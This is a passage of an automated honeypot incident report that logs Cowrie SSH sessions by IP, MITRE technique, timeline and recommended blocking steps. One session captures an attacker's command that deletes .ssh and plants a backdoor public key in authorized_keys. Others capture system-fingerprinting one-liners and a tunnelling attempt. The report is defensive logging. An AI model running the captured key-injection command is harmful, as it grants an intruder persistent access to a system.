| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:15:47` | `cowrie.session.connect` |
| `2026-09-04 12:15:47` | `cowrie.client.version` |
| `2026-09-04 12:15:47` | `cowrie.client.kex` |
| `2026-09-04 12:15:47` | `cowrie.login.success` |
| `2026-09-04 12:15:48` | `cowrie.session.params` |
| `2026-09-04 12:15:48` | `cowrie.command.input` |
| `2026-09-04 12:15:48` | `cowrie.log.closed` |
| `2026-09-04 12:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-663550efa24e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:17 |
| **Last Seen** | 2026-09-04 12:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:17:28` | `cowrie.session.connect` |
| `2026-09-04 12:17:28` | `cowrie.client.version` |
| `2026-09-04 12:17:28` | `cowrie.client.kex` |
| `2026-09-04 12:17:28` | `cowrie.login.success` |
| `2026-09-04 12:17:29` | `cowrie.session.params` |
| `2026-09-04 12:17:29` | `cowrie.command.input` |
| `2026-09-04 12:17:29` | `cowrie.log.closed` |
| `2026-09-04 12:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4502d7a0f31a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:19 |
| **Last Seen** | 2026-09-04 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:19:11` | `cowrie.session.connect` |
| `2026-09-04 12:19:11` | `cowrie.client.version` |
| `2026-09-04 12:19:12` | `cowrie.client.kex` |
| `2026-09-04 12:19:12` | `cowrie.login.success` |
| `2026-09-04 12:19:12` | `cowrie.session.params` |
| `2026-09-04 12:19:12` | `cowrie.command.input` |
| `2026-09-04 12:19:12` | `cowrie.log.closed` |
| `2026-09-04 12:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a8ade1cbcc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:20 |
| **Last Seen** | 2026-09-04 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:20:48` | `cowrie.session.connect` |
| `2026-09-04 12:20:48` | `cowrie.client.version` |
| `2026-09-04 12:20:48` | `cowrie.client.kex` |
| `2026-09-04 12:20:49` | `cowrie.login.success` |
| `2026-09-04 12:20:50` | `cowrie.session.params` |
| `2026-09-04 12:20:50` | `cowrie.command.input` |
| `2026-09-04 12:20:50` | `cowrie.log.closed` |
| `2026-09-04 12:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-287809daa49a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:22 |
| **Last Seen** | 2026-09-04 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:22:21` | `cowrie.session.connect` |
| `2026-09-04 12:22:21` | `cowrie.client.version` |
| `2026-09-04 12:22:21` | `cowrie.client.kex` |
| `2026-09-04 12:22:22` | `cowrie.login.success` |
| `2026-09-04 12:22:22` | `cowrie.session.params` |
| `2026-09-04 12:22:22` | `cowrie.command.input` |
| `2026-09-04 12:22:23` | `cowrie.log.closed` |
| `2026-09-04 12:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e6b19e1c8bf

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:23 |
| **Last Seen** | 2026-09-04 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:23:57` | `cowrie.session.connect` |
| `2026-09-04 12:23:57` | `cowrie.client.version` |
| `2026-09-04 12:23:57` | `cowrie.client.kex` |
| `2026-09-04 12:23:57` | `cowrie.login.success` |
| `2026-09-04 12:23:58` | `cowrie.session.params` |
| `2026-09-04 12:23:58` | `cowrie.command.input` |
| `2026-09-04 12:23:58` | `cowrie.log.closed` |
| `2026-09-04 12:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06656f4a1b5e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:25 |
| **Last Seen** | 2026-09-04 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:25:35` | `cowrie.session.connect` |
| `2026-09-04 12:25:35` | `cowrie.client.version` |
| `2026-09-04 12:25:35` | `cowrie.client.kex` |
| `2026-09-04 12:25:36` | `cowrie.login.success` |
| `2026-09-04 12:25:37` | `cowrie.session.params` |
| `2026-09-04 12:25:37` | `cowrie.command.input` |
| `2026-09-04 12:25:37` | `cowrie.log.closed` |
| `2026-09-04 12:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f4576438a59

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:27 |
| **Last Seen** | 2026-09-04 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:27:10` | `cowrie.session.connect` |
| `2026-09-04 12:27:10` | `cowrie.client.version` |
| `2026-09-04 12:27:10` | `cowrie.client.kex` |
| `2026-09-04 12:27:10` | `cowrie.login.success` |
| `2026-09-04 12:27:11` | `cowrie.session.params` |
| `2026-09-04 12:27:11` | `cowrie.command.input` |
| `2026-09-04 12:27:11` | `cowrie.log.closed` |
| `2026-09-04 12:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9423d0b7d38f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:28 |
| **Last Seen** | 2026-09-04 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:28:42` | `cowrie.session.connect` |
| `2026-09-04 12:28:42` | `cowrie.client.version` |
| `2026-09-04 12:28:42` | `cowrie.client.kex` |
| `2026-09-04 12:28:42` | `cowrie.login.success` |
| `2026-09-04 12:28:43` | `cowrie.session.params` |
| `2026-09-04 12:28:43` | `cowrie.command.input` |
| `2026-09-04 12:28:43` | `cowrie.log.closed` |
| `2026-09-04 12:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ce81672df0

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:30 |
| **Last Seen** | 2026-09-04 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:30:21` | `cowrie.session.connect` |
| `2026-09-04 12:30:21` | `cowrie.client.version` |
| `2026-09-04 12:30:22` | `cowrie.client.kex` |
| `2026-09-04 12:30:22` | `cowrie.login.success` |
| `2026-09-04 12:30:23` | `cowrie.session.params` |
| `2026-09-04 12:30:23` | `cowrie.command.input` |
| `2026-09-04 12:30:23` | `cowrie.log.closed` |
| `2026-09-04 12:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd772858552a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:32 |
| **Last Seen** | 2026-09-04 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:32:07` | `cowrie.session.connect` |
| `2026-09-04 12:32:07` | `cowrie.client.version` |
| `2026-09-04 12:32:07` | `cowrie.client.kex` |
| `2026-09-04 12:32:07` | `cowrie.login.success` |
| `2026-09-04 12:32:08` | `cowrie.session.params` |
| `2026-09-04 12:32:08` | `cowrie.command.input` |
| `2026-09-04 12:32:08` | `cowrie.log.closed` |
| `2026-09-04 12:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6b4cf01bc3

| Field | Detail |
|---|---|
| **Source IP** | `23.29.118[.]224` |
| **First Seen** | 2026-09-04 12:32 |
| **Last Seen** | 2026-09-04 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:32:47` | `cowrie.session.connect` |
| `2026-09-04 12:32:47` | `cowrie.client.version` |
| `2026-09-04 12:32:47` | `cowrie.client.kex` |
| `2026-09-04 12:32:47` | `cowrie.login.success` |
| `2026-09-04 12:32:48` | `cowrie.session.params` |
| `2026-09-04 12:32:48` | `cowrie.command.input` |
| `2026-09-04 12:32:48` | `cowrie.command.failed` |
| `2026-09-04 12:32:48` | `cowrie.log.closed` |
| `2026-09-04 12:32:48` | `cowrie.session.params` |
| `2026-09-04 12:32:48` | `cowrie.command.input` |
| `2026-09-04 12:32:48` | `cowrie.session.file_download` |
| `2026-09-04 12:32:48` | `cowrie.log.closed` |
| `2026-09-04 12:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.29.118[.]224` to AbuseIPDB if not already reported
- [ ] Block `23.29.118[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db86e368721f

| Field | Detail |
|---|---|
| **Source IP** | `23.29.118[.]224` |
| **First Seen** | 2026-09-04 12:32 |
| **Last Seen** | 2026-09-04 12:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:32:48` | `cowrie.session.connect` |
| `2026-09-04 12:32:48` | `cowrie.client.version` |
| `2026-09-04 12:32:48` | `cowrie.client.kex` |
| `2026-09-04 12:32:48` | `cowrie.login.success` |
| `2026-09-04 12:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.29.118[.]224` to AbuseIPDB if not already reported
- [ ] Block `23.29.118[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a679ce24d64

| Field | Detail |
|---|---|
| **Source IP** | `23.29.118[.]224` |
| **First Seen** | 2026-09-04 12:32 |
| **Last Seen** | 2026-09-04 12:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:32:48` | `cowrie.session.connect` |
| `2026-09-04 12:32:48` | `cowrie.client.version` |
| `2026-09-04 12:32:48` | `cowrie.client.kex` |
| `2026-09-04 12:32:48` | `cowrie.login.success` |
| `2026-09-04 12:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.29.118[.]224` to AbuseIPDB if not already reported
- [ ] Block `23.29.118[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac08f4ba868

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:33 |
| **Last Seen** | 2026-09-04 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:33:47` | `cowrie.session.connect` |
| `2026-09-04 12:33:47` | `cowrie.client.version` |
| `2026-09-04 12:33:48` | `cowrie.client.kex` |
| `2026-09-04 12:33:48` | `cowrie.login.success` |
| `2026-09-04 12:33:48` | `cowrie.session.params` |
| `2026-09-04 12:33:48` | `cowrie.command.input` |
| `2026-09-04 12:33:49` | `cowrie.log.closed` |
| `2026-09-04 12:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f548bd3e2a3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-04 12:34 |
| **Last Seen** | 2026-09-04 12:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:34:48` | `cowrie.session.connect` |
| `2026-09-04 12:34:49` | `cowrie.client.version` |
| `2026-09-04 12:34:49` | `cowrie.client.kex` |
| `2026-09-04 12:34:52` | `cowrie.login.success` |
| `2026-09-04 12:34:54` | `cowrie.session.params` |
| `2026-09-04 12:34:54` | `cowrie.command.input` |
| `2026-09-04 12:34:54` | `cowrie.command.input` |
| `2026-09-04 12:34:54` | `cowrie.command.input` |
| `2026-09-04 12:34:54` | `cowrie.command.input` |
| `2026-09-04 12:34:54` | `cowrie.command.input` |
| `2026-09-04 12:34:54` | `cowrie.command.success` |
| `2026-09-04 12:34:54` | `cowrie.command.input` |
| `2026-09-04 12:34:54` | `cowrie.command.input` |
| `2026-09-04 12:34:54` | `cowrie.command.input` |
| `2026-09-04 12:34:54` | `cowrie.command.input` |
| `2026-09-04 12:34:55` | `cowrie.log.closed` |
| `2026-09-04 12:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd03347858c3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:35 |
| **Last Seen** | 2026-09-04 12:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:35:23` | `cowrie.session.connect` |
| `2026-09-04 12:35:23` | `cowrie.client.version` |
| `2026-09-04 12:35:24` | `cowrie.client.kex` |
| `2026-09-04 12:35:24` | `cowrie.login.success` |
| `2026-09-04 12:35:24` | `cowrie.session.params` |
| `2026-09-04 12:35:24` | `cowrie.command.input` |
| `2026-09-04 12:35:25` | `cowrie.log.closed` |
| `2026-09-04 12:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f546c974761f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 12:36 |
| **Last Seen** | 2026-09-04 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:36:16` | `cowrie.session.connect` |
| `2026-09-04 12:36:16` | `cowrie.client.version` |
| `2026-09-04 12:36:16` | `cowrie.client.kex` |
| `2026-09-04 12:36:17` | `cowrie.login.success` |
| `2026-09-04 12:36:17` | `cowrie.direct-tcpip.request` |
| `2026-09-04 12:36:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 12:36:17` | `cowrie.direct-tcpip.data` |
| `2026-09-04 12:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e673d8c68e4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:37 |
| **Last Seen** | 2026-09-04 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:37:02` | `cowrie.session.connect` |
| `2026-09-04 12:37:02` | `cowrie.client.version` |
| `2026-09-04 12:37:02` | `cowrie.client.kex` |
| `2026-09-04 12:37:02` | `cowrie.login.success` |
| `2026-09-04 12:37:03` | `cowrie.session.params` |
| `2026-09-04 12:37:03` | `cowrie.command.input` |
| `2026-09-04 12:37:03` | `cowrie.log.closed` |
| `2026-09-04 12:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db557e32df34

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-04 12:37 |
| **Last Seen** | 2026-09-04 12:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:37:10` | `cowrie.session.connect` |
| `2026-09-04 12:37:11` | `cowrie.client.version` |
| `2026-09-04 12:37:11` | `cowrie.client.kex` |
| `2026-09-04 12:37:13` | `cowrie.login.success` |
| `2026-09-04 12:37:15` | `cowrie.session.params` |
| `2026-09-04 12:37:15` | `cowrie.command.input` |
| `2026-09-04 12:37:15` | `cowrie.command.input` |
| `2026-09-04 12:37:15` | `cowrie.command.input` |
| `2026-09-04 12:37:15` | `cowrie.command.input` |
| `2026-09-04 12:37:15` | `cowrie.command.input` |
| `2026-09-04 12:37:15` | `cowrie.command.success` |
| `2026-09-04 12:37:15` | `cowrie.command.input` |
| `2026-09-04 12:37:15` | `cowrie.command.input` |
| `2026-09-04 12:37:15` | `cowrie.command.input` |
| `2026-09-04 12:37:15` | `cowrie.command.input` |
| `2026-09-04 12:37:16` | `cowrie.log.closed` |
| `2026-09-04 12:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1fba3161346

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:38 |
| **Last Seen** | 2026-09-04 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:38:41` | `cowrie.session.connect` |
| `2026-09-04 12:38:41` | `cowrie.client.version` |
| `2026-09-04 12:38:41` | `cowrie.client.kex` |
| `2026-09-04 12:38:42` | `cowrie.login.success` |
| `2026-09-04 12:38:42` | `cowrie.session.params` |
| `2026-09-04 12:38:42` | `cowrie.command.input` |
| `2026-09-04 12:38:42` | `cowrie.log.closed` |
| `2026-09-04 12:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c89529ac9d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-04 12:39 |
| **Last Seen** | 2026-09-04 12:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:39:22` | `cowrie.session.connect` |
| `2026-09-04 12:39:23` | `cowrie.client.version` |
| `2026-09-04 12:39:23` | `cowrie.client.kex` |
| `2026-09-04 12:39:25` | `cowrie.login.success` |
| `2026-09-04 12:39:27` | `cowrie.session.params` |
| `2026-09-04 12:39:27` | `cowrie.command.input` |
| `2026-09-04 12:39:27` | `cowrie.command.input` |
| `2026-09-04 12:39:27` | `cowrie.command.input` |
| `2026-09-04 12:39:27` | `cowrie.command.input` |
| `2026-09-04 12:39:27` | `cowrie.command.input` |
| `2026-09-04 12:39:27` | `cowrie.command.success` |
| `2026-09-04 12:39:27` | `cowrie.command.input` |
